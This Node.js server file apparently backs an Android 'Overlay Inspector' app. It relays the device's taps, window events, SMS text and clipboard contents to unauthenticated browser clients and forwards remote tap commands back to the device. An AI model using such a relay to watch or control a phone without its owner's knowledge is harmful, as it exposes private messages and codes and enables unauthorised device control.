/**
 * Overlay Inspector — Local Server
 * ─────────────────────────────────────────────────────────────────────────
 * • HTTP on :3000  → serves web console UI from /public
 * • WebSocket on the same port — two client types:
 *     1. Android app  (identifies via hello { client: "android" })
 *     2. Browser      (everything else)
 *
 * Flow:
 *   Android tap/window events → broadcast to all browser clients
 *   Browser command (tap / sequence) → forward to Android
 */

const express = require('express');
const { WebSocketServer, OPEN } = require('ws');
const http = require('http');
const path = require('path');

const app  = express();
const httpServer = http.createServer(app);
const wss  = new WebSocketServer({ server: httpServer });

// ── Static files + JSON body parser ─────────────────────────────────────
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── State ────────────────────────────────────────────────────────────────
let androidSocket = null;          // the one connected Android client
const browserClients = new Set();  // all connected browser clients
const eventLog = [];               // recent events (newest first)
const MAX_LOG = 300;
const startTime = Date.now();

// ── WebSocket connection handler ──────────────────────────────────────────
wss.on('connection', (ws) => {
    ws._clientType = 'unknown';

    ws.on('message', (raw) => {
        let msg;
        try { msg = JSON.parse(raw.toString()); }
        catch { return; }

        // ── Handshake ───────────────────────────────────────────────────
        if (msg.type === 'hello') {
            if (msg.client === 'android') {
                ws._clientType = 'android';
                androidSocket = ws;
                console.log('\n[DEVICE] Android device connected');
                broadcastToBrowsers({ type: 'device_status', connected: true });
            } else {
                ws._clientType = 'browser';
                browserClients.add(ws);
                // Send current state to the newly connected browser
                ws.send(JSON.stringify({
                    type: 'init',
                    deviceConnected: androidSocket !== null && androidSocket.readyState === OPEN,
                    uptime: Math.floor((Date.now() - startTime) / 1000),
                    log: eventLog.slice(0, 100)
                }));
            }
            return;
        }

        // ── Android → Server ─────────────────────────────────────────────
        if (ws._clientType === 'android') {
            const entry = { ...msg, _receivedAt: new Date().toISOString() };

            // Prepend to log (newest first), trim to MAX_LOG
            eventLog.unshift(entry);
            if (eventLog.length > MAX_LOG) eventLog.pop();

            // Pretty-print to server console
            if (msg.type === 'tap_event') {
                console.log(`[TAP]    x=${msg.x}  y=${msg.y}  |  ${msg.package || '?'} / ${shortClass(msg.activity)}`);
            } else if (msg.type === 'window_event') {
                console.log(`[WINDOW] ${msg.package || '?'} / ${shortClass(msg.activity)}`);
            } else if (msg.type === 'sms') {
                console.log(`[SMS]    ${msg.text}`);
            } else if (msg.type === 'clipboard') {
                console.log(`[CLIP]   ${msg.text}`);
            }

            broadcastToBrowsers({ type: 'event', data: entry });
            return;
        }

        // ── Browser → Server (command for Android) ───────────────────────
        if (ws._clientType === 'browser' && msg.type === 'command') {
            if (!androidSocket || androidSocket.readyState !== OPEN) {
                ws.send(JSON.stringify({ type: 'error', message: 'Android not connected' }));
                return;
            }
            androidSocket.send(JSON.stringify(msg));
            console.log(`[CMD]    Sent to Android:`, JSON.stringify(msg.action === 'sequence'
                ? { action: msg.action, steps: msg.steps?.length + ' steps' }
                : msg));
        }
    });

    ws.on('close', () => {
        if (ws._clientType === 'android') {
            androidSocket = null;
            console.log('[DEVICE] Android device disconnected');
            broadcastToBrowsers({ type: 'device_status', connected: false });
        } else {
            browserClients.delete(ws);
        }
    });

    ws.on('error', (err) => {
        console.error(`[WS Error] ${ws._clientType}:`, err.message);
    });
});

// ── REST endpoints ────────────────────────────────────────────────────────

/** Send a command to Android via HTTP (alternative to WebSocket from browser). */
app.post('/command', (req, res) => {
    if (!androidSocket || androidSocket.readyState !== OPEN) {
        return res.status(503).json({ error: 'Android not connected' });
    }
    androidSocket.send(JSON.stringify({ type: 'command', ...req.body }));
    console.log(`[HTTP CMD] Sent:`, req.body);
    res.json({ ok: true });
});

/** Return the event log as JSON. */
app.get('/events', (_req, res) => res.json(eventLog));

/** Server health / status. */
app.get('/status', (_req, res) => res.json({
    uptime: Math.floor((Date.now() - startTime) / 1000),
    androidConnected: androidSocket !== null && androidSocket.readyState === OPEN,
    browserClients: browserClients.size,
    totalEvents: eventLog.length
}));

// ── Helpers ───────────────────────────────────────────────────────────────

function broadcastToBrowsers(data) {
    const msg = JSON.stringify(data);
    for (const ws of browserClients) {
        if (ws.readyState === OPEN) ws.send(msg);
    }
}

function shortClass(cls = '') {
    const parts = cls.split('.');
    return parts.length > 1 ? parts[parts.length - 1] : cls;
}

// ── Start ─────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
httpServer.listen(PORT, '0.0.0.0', () => {
    const ifaces = require('os').networkInterfaces();
    let localIp = 'localhost';
    for (const name of Object.keys(ifaces)) {
        for (const iface of ifaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                localIp = iface.address; break;
            }
        }
    }
    console.log(`\n╔══════════════════════════════════════════════════╗`);
    console.log(`║      Overlay Inspector Server                   ║`);
    console.log(`║  Web console:  http://${localIp}:${PORT}${''.padEnd(22 - localIp.length - String(PORT).length)}║`);
    console.log(`║  Android URL:  ws://${localIp}:${PORT}${''.padEnd(23 - localIp.length - String(PORT).length)}║`);
    console.log(`╚══════════════════════════════════════════════════╝\n`);
});
